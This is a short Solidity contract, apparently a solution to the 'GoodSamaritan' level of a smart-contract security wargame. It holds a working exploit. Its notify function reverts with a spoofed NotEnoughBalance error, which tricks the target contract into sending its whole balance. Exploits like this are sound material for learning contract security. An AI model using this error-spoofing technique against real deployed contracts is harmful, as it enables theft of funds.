// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/GoodSamaritan.sol";

// Error to simulate (bubble up)
error NotEnoughBalance();

contract GoodSamaritanAttack {
  address private immutable _goodSamaritan;

  constructor(address goodSamaritan_) {
    _goodSamaritan = goodSamaritan_;
  }

  function attack() external {
    GoodSamaritan(_goodSamaritan).requestDonation();
  }

  function notify(uint256 amount_) external pure {
    if(amount_ <= 10) {
      revert NotEnoughBalance();
    }
  }
}
